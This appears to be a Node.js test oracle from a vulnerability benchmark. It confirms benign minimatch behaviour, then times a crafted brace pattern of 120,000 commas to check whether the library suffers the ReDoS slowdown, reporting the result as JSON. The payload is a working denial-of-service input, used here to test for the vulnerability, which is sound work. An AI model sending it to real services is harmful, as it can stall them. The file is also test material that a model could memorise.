let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function finish() {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: !!operation_completed,
    exploit_succeeded: !!exploit_succeeded,
    evidence: String(evidence)
  }));
}

try {
  const minimatch = require('minimatch');

  // Benign operation must succeed first.
  const benign1 = minimatch('file.js', '*.js') === true;
  const benign2 = minimatch('file.txt', '*.js') === false;
  if (!benign1 || !benign2) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'benign_operation_failed';
    finish();
  } else {
    operation_completed = true;

    // CVE shape for minimatch 3.x ReDoS: heavy brace expansion from many commas.
    // Use size that is bounded yet usually separates vulnerable/fixed behavior.
    const commas = 120000;
    const maliciousPattern = '{' + ','.repeat(commas) + '}';

    const t0 = process.hrtime.bigint();
    let malRes;
    try {
      malRes = minimatch('x', maliciousPattern);
    } catch (e) {
      exploit_succeeded = false;
      evidence = 'malicious_threw:' + (e && e.message ? e.message : String(e));
      finish();
      return;
    }
    const ms = Number(process.hrtime.bigint() - t0) / 1e6;

    // Absolute threshold only, to avoid noisy baseline-ratio effects.
    // Vulnerable versions exhibit pronounced slowdown; patched should stay below.
    exploit_succeeded = ms > 300;
    evidence = 'commas=' + commas + ';malicious_ms=' + ms.toFixed(3) + ';result=' + String(malRes);
    finish();
  }
} catch (e) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup_or_module_failure:' + (e && e.message ? e.message : String(e));
  finish();
}
